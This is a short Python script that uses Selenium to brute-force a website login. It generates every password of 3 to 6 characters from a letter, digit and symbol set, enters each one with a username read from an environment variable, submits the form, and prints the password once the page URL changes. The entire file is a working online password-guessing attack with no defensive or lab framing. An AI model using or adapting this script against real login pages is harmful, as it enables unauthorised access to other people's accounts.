from selenium import webdriver
import os

characters =  \
     ['A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
     'a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
     '1','2','3','4','5','6','7','8','9',
     '*','-',' ']

len_min , len_max = 3 , 6
length = len_min
pwd_img = [0 for i in range(length)]
pwd = characters[0] * length
pwd_img[-1] -= 1

url = ''
utilisateur = os.getenv("MY_USERNAME")

driver = webdriver.Chrome()
driver.get(url)


while True :
     while driver.current_url == url and length<=len_max:
          print(">>>>>>> generating passwords "+str(length)+" <<<<<<<")

          pointer = length - 1
          while pwd != characters[-1] * length :

               if pwd_img[pointer] <= len(characters)-2 :
                    pwd_img[pointer] += 1

               else :
                    for i in range(len(pwd_img)-1,-1,-1) :
                         if pwd_img[i] != len(characters)-1 :
                              pwd_img[i] += 1
                              for j in range(i+1,len(pwd_img)) :
                                   pwd_img[j] = 0
                              break
               pwd = ""
               for k in range(len(pwd_img)) :
                    pwd += characters[pwd_img[k]]

               print(f">>> TRYING : {pwd}")
               elem = driver.find_element(by='name', value="login")
               elem.clear()
               elem.send_keys(utilisateur)

               elem2 = driver.find_element(by='name', value="password")
               elem2.clear()
               elem2.send_keys(pwd)
               driver.find_element(by='id', value='Valider').click()

               if driver.current_url != url :
                    print(">>>> your password is : "+str(pwd)+" <<<<")
                    break
          length+=1
          pwd_img = [0 for i in range(length)]
          pwd = characters[0] * length
          pwd_img[-1] -= 1

     pass
